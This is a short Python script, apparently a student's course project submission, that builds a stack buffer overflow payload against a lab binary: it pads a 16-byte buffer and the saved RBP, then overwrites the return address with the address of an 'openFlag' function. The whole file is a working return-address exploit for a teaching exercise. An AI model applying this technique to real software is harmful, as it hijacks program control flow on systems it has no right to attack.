import struct
# Tobias DiRito & Trevor Olson -- Group 8
# Project 2 Submission
#1.) Replace with actual address to open the flag
open_flag_addr = 0x4011f6 # address of openFlag function found using gdb

#2.) Fill the buffer (size)
payload = b"A" * 16 # buffer size allocated in ex1.c
#3.) overwrite saved RBP (size)
payload += b"B" * 8 # saved RBP size of 8 -- as discussed in lecture

payload += struct.pack("<Q", open_flag_addr)  # overwrite return address

import sys
sys.stdout.buffer.write(payload)
# print(payload)